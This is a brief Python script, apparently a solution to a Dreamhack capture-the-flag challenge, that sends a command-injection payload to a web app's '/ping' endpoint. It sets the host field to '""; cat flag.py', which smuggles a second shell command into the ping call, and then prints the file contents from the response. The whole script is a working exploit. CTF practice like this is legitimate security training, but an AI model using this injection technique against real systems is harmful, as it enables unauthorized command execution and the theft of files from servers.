from bs4 import BeautifulSoup
import requests


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:21945"
    req = requests.post(url+'/ping', {'host':'""; cat flag.py'})
    print(BeautifulSoup(req.content, 'html.parser').pre)